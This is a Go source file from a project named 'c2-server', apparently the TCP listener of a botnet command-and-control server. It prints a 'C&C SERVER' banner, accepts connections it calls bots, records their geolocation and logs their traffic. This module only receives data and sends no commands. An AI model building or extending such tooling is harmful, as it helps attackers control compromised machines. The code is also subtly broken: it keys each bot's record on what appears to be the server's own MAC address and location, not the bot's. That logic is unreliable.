package modules

import (
	"c2-server/config"
	"c2-server/constants"
	"c2-server/lib"
	"c2-server/types"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"net"
	"os"
	"time"
)

type TCPServer struct {
	host   string
	port   int
	cache  *lib.Cache
	logger *lib.Logger
}

func NewTCPServer(cache *lib.Cache) *TCPServer {
	return &TCPServer{
		host:   config.ServerRemoteAddr,
		port:   config.ServerRemotePort,
		cache:  cache,
		logger: lib.NewLogger(),
	}
}

func (this *TCPServer) StartServer() error {
	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", this.port))
	if err != nil {
		return fmt.Errorf("Error starting server: %v", err)
	}
	defer listener.Close()

	fmt.Println("\n" + ` ██████╗   ██╗    ██████╗    ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗
██╔════╝   ██║   ██╔════╝    ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗
██║     ████████╗██║         ███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝
██║     ██╔═██╔═╝██║         ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗
╚██████╗██████║  ╚██████╗    ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║
 ╚═════╝╚═════╝   ╚═════╝    ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝
                                                                              `)

	this.logger.Info(fmt.Sprintf("Server started %s:%d", this.host, this.port))

	for {
		conn, err := listener.Accept()
		if err != nil {
			this.logger.Error(fmt.Sprintf("Error accepting connection: %v", err))
			continue
		}

		go this.handleConnectionCallback(conn)
	}
}

func (this *TCPServer) handleConnectionCallback(conn net.Conn) {
	defer conn.Close()

	buffer := make([]byte, constants.MAX_PACKET_SIZE)

	n, err := conn.Read(buffer)
	if err != nil {
		fmt.Println(err.Error())
		this.logger.Info(fmt.Sprintf("Error reading data: %s", conn.RemoteAddr()))
		return
	}

	this.handleBot(conn, buffer[:n])
}

func (this *TCPServer) handleBot(conn net.Conn, data []byte) {
	defer func() {
		this.cache.RemoveCache(lib.GetMAC())
		this.logger.Info(fmt.Sprintf("Bot disconnect: %s", conn.RemoteAddr()))
	}()

	mac := lib.GetMAC()
	ipgeo := lib.GetIPGeo()

	this.cache.NewInitial(mac)
	this.cache.SetCache(mac, "ipgeo", ipgeo, 10*time.Minute)

	this.logger.Info(fmt.Sprintf("CONNECTED: %s:%d", this.cache.GetCache(mac, "ipgeo").(*types.IPGeo).IP, conn.RemoteAddr().(*net.TCPAddr).Port))

	buffer := make([]byte, constants.MAX_PACKET_SIZE)

	for {
		data, err := conn.Read(buffer)
		if err != nil {
			if errors.Is(err, io.EOF) {
				this.logger.Info(fmt.Sprintf("Bot disconnect: %s", this.cache.GetCache(mac, "ipgeo").(*types.IPGeo).IP)) // defer
			}

			if sockErr, ok := err.(*net.OpError); ok && sockErr.Op == "read" && sockErr.Err.Error() == "use of closed network connection" {
				this.logger.Info(fmt.Sprintf("Bot disconnect: %s", this.cache.GetCache(mac, "ipgeo").(*types.IPGeo).IP)) // defer
			} else if os.IsTimeout(err) {
				this.logger.Info(fmt.Sprintf("Bot disconnect (timeout): %s", this.cache.GetCache(mac, "ipgeo").(*types.IPGeo).IP)) // defer
			} else {
				this.logger.Error(fmt.Sprintf("Error reading bot from connection: %s", err.Error())) // defer
			}

			break
		}

		this.logger.Info(fmt.Sprintf("DATA[%d]: %s", data, hex.EncodeToString(buffer[:data])))
		// deviceClient.parseDate(buffer[:data])
	}
}
